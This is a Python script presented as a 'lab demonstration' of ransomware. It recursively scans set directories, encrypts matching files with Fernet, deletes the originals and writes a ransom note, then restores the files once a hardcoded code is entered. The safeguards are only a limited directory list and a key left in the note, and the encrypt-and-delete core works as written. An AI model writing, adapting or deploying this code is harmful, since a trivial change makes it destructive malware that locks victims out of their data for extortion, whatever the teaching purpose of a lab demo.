import os
import json
from cryptography.fernet import Fernet  # pip install cryptography
from pathlib import Path

# Configuration (SAFE FOR LAB USE)
TARGET_DIRS = [  # Only these directories will be affected
    str(Path.home() / "ransomware_test"),
    str(Path.home() / "Desktop/test_files")
]
FILE_EXTENSIONS = ['.test', '.txt', '.doc']  # Only these file types
RANSOM_NOTE = "=== LAB DEMO RANSOM NOTE ==="
DECRYPTION_KEY = "DEMO-KEY-1234"  # Hardcoded for safe decryption


class RansomwareDemo:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []

    def generate_key_file(self):
        """Create decryption instructions (safe for lab)"""
        instructions = {
            'warning': "THIS IS A CONTROLLED LAB DEMONSTRATION",
            'key': self.key.decode(),
            'decrypt_code': DECRYPTION_KEY
        }
        with open("DECRYPT_INSTRUCTIONS.txt", "w") as f:
            f.write(RANSOM_NOTE + "\n\n")
            f.write(json.dumps(instructions, indent=4))

    def encrypt_file(self, filepath):
        """Demonstrate file encryption (non-destructive)"""
        try:
            # Read original file
            with open(filepath, "rb") as f:
                data = f.read()

            # Encrypt data
            encrypted = self.cipher.encrypt(data)

            # Write encrypted file
            with open(filepath + ".demo_encrypted", "wb") as f:
                f.write(encrypted)

            # Remove original (simulate real ransomware)
            os.remove(filepath)
            self.encrypted_files.append(filepath)

        except Exception as e:
            pass

    def decrypt_file(self, filepath):
        """Safe decryption for lab cleanup"""
        try:
            with open(filepath, "rb") as f:
                data = f.read()

            decrypted = self.cipher.decrypt(data)

            original_path = filepath[:-len(".demo_encrypted")]
            with open(original_path, "wb") as f:
                f.write(decrypted)

            os.remove(filepath)

        except Exception as e:
            pass

    def scan_and_encrypt(self):
        """Target specific files for encryption"""
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                for root, _, files in os.walk(target_dir):
                    for file in files:
                        if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                            self.encrypt_file(os.path.join(root, file))

    def start_decryption(self):
        """Safe cleanup process"""
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                for root, _, files in os.walk(target_dir):
                    for file in files:
                        if file.endswith(".demo_encrypted"):
                            self.decrypt_file(os.path.join(root, file))
        print("[*] Lab files decrypted successfully")


if __name__ == "__main__":
    # Safety checks
    if not all(os.path.exists(d) for d in TARGET_DIRS):
        print("Error: Test directories not found!")
        print("Create these first:")
        print("\n".join(TARGET_DIRS))
        exit()

    demo = RansomwareDemo()

    # Encryption phase
    demo.scan_and_encrypt()
    demo.generate_key_file()

    # Lab demonstration control
    while True:
        user_input = input("\nEnter decryption code: ")
        if user_input == DECRYPTION_KEY:
            demo.start_decryption()
            break
        print("Invalid code! (Use 'DEMO-KEY-1234' for lab decryption)")